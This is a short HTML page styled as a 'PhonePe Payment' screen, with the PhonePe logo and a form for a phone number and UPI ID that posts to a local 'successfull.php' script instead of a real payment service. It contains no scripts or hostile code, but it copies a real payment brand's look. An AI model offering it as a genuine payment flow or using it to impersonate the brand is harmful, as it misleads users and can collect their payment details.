<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PhonePe Payment</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
    <style>
        body {
            background-image: linear-gradient(to right, #74ebd5 0%, #9face6 100%);
        }
        .payment-container {
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .payment-container img {
            max-width: 150px;
            display: block;
            margin: 0 auto 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="payment-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/74/PhonePe_logo.png" alt="PhonePe">
            <h2 class="text-center">PhonePe Payment</h2>
            <form action="successfull.php" method="POST">
                <div class="mb-3">
                    <label for="phone-number" class="form-label">Phone Number</label>
                    <input type="tel" class="form-control" id="phone-number" name="phone-number" required>
                </div>
                <div class="mb-3">
                    <label for="upi-id" class="form-label">UPI ID</label>
                    <input type="text" class="form-control" id="upi-id" name="upi-id" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Proceed with Payment</button>
            </form>
        </div>
    </div>
</body>
</html>
